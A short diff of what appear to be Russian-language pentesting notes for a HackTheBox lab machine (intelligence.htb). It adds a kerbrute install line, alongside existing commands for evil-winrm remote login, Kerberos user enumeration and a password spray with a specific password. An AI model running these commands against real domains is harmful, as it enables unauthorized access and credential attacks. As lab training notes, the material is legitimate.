@@ -20,6 +20,8 @@ sudo apt install python3-venv -y    ====>python3 -m venv .venv ====>source .venv
 
 evil-winrm -i <IP-адрес> -u <пользователь> -p <пароль>
 
+sudo apt update && sudo apt install kerbrute
+
 kerbrute userenum -d <имя_домена> --dc <ip_адрес_контроллера_домена> <путь_к_файлу_с_именами>
 
 kerbrute password-spray -d intelligence.htb --dc 10.10.10.248 users.txt Newuser2020M спрейим пароль
